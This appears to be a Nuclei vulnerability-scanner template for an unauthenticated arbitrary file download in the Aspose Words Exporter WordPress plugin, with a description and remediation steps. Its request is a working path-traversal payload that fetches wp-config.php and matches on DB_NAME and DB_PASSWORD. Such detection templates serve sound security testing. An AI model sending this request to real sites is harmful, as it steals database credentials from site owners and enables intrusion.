id: aspose-words-file-download
info:
  name: Aspose Words Exporter < 2.0 - Arbitrary File Retrieval
  author:
  - l0ne1y
  tags:
  - wordpress
  - wp-plugin
  - lfi
  - aspose
  description: |-
    Wordpress Plugin Aspose Words Exporter < 2.0 has an arbitrary file download vulnerability
    The Aspose.Words Exporter WordPress plugin is affected by an arbitrary file download security vulnerability.
    The plugin's aspose_doc_exporter_download.php file does not restrict access, check permissions, or validate file parameters, allowing unauthenticated users to download any file from the blog
  reference:
  - https://wpscan.com/vulnerability/7869
  - https://wordpress.org/plugins/aspose-doc-exporter
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.com/zh-cn/install-plugins/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php'
  method: GET
